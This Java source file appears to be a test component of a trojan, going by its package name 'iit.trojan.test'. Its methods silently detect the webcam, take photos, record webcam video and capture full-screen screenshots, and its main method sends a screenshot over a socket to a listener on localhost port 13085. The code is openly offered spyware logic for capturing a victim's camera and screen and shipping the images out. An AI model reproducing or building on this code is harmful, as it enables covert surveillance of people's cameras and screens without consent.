package iit.trojan.test;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.xuggle.mediatool.IMediaWriter;
import com.xuggle.mediatool.ToolFactory;
import com.xuggle.xuggler.ICodec;
import com.xuggle.xuggler.IPixelFormat;
import com.xuggle.xuggler.IVideoPicture;
import com.xuggle.xuggler.video.ConverterFactory;
import com.xuggle.xuggler.video.IConverter;

public class Send {
	public static void takePictureCam() {
		Webcam webcam = null;
		try {
			// get default webcam and open it
			webcam = Webcam.getDefault();
			webcam.setViewSize(WebcamResolution.VGA.getSize());
			webcam.open();
			// get image
			BufferedImage image = webcam.getImage();

			// save image to jpg file
			ImageIO.write(image, "jpg", new File("testCam.jpg"));

		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			webcam.close();
		}
	}

	public static void imageScreen() {
		try {
			/*
			 * Let the program wait for 5 seconds to allow you to open the window whose
			 * screenshot has to be captured
			 */
			Thread.sleep(1000);
			Robot robot = new Robot();
			String fileName = "FullScreenshot.jpg";
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
			ImageIO.write(screenFullImage, "jpg", new File(fileName));

		} catch (AWTException | IOException | InterruptedException ex) {
			System.err.println(ex);
		}
	}

	public static void detectCam() {
		Webcam webcam = Webcam.getDefault();
		if (webcam != null) {
			System.out.println("Webcam: " + webcam.getName());
		} else {
			System.out.println("No webcam detected");
		}
	}

	public static void encoder() {
		try {
			File file = new File("output2.mp4");

			IMediaWriter writer = ToolFactory.makeWriter(file.getName());
			Dimension size = WebcamResolution.QVGA.getSize();

			writer.addVideoStream(0, 0, ICodec.ID.CODEC_ID_H264, size.width, size.height);

			Webcam webcam = Webcam.getDefault();
			webcam.setViewSize(size);
			webcam.open(true);

			long start = System.currentTimeMillis();

			for (int i = 0; i < 50; i++) {

				System.out.println("Capture frame " + i);

				BufferedImage image = ConverterFactory.convertToType(webcam.getImage(), BufferedImage.TYPE_3BYTE_BGR);
				IConverter converter = ConverterFactory.createConverter(image, IPixelFormat.Type.YUV420P);

				IVideoPicture frame = converter.toPicture(image, (System.currentTimeMillis() - start) * 1000);
				frame.setKeyFrame(i == 0);
				frame.setQuality(0);
				writer.encodeVideo(0, frame);

				// 10 FPS

				Thread.sleep(100);

			}

			writer.close();
			webcam.close();
			System.out.println("Video recorded in file: " + file.getAbsolutePath());
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) throws Exception {
		Socket socket = new Socket("localhost", 13085);
		OutputStream outputStream = socket.getOutputStream();

		encoder();
		Thread.sleep(300);
		BufferedImage image = ImageIO.read(new File("FullScreenshot.jpg"));

		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		ImageIO.write(image, "jpg", byteArrayOutputStream);
		byte[] size = ByteBuffer.allocate(4).putInt(byteArrayOutputStream.size()).array();
		outputStream.write(size);
		outputStream.write(byteArrayOutputStream.toByteArray());
		outputStream.flush();
		System.out.println("Flushed: " + System.currentTimeMillis());

		Thread.sleep(120000);
		System.out.println("Closing: " + System.currentTimeMillis());
		socket.close();
	}
}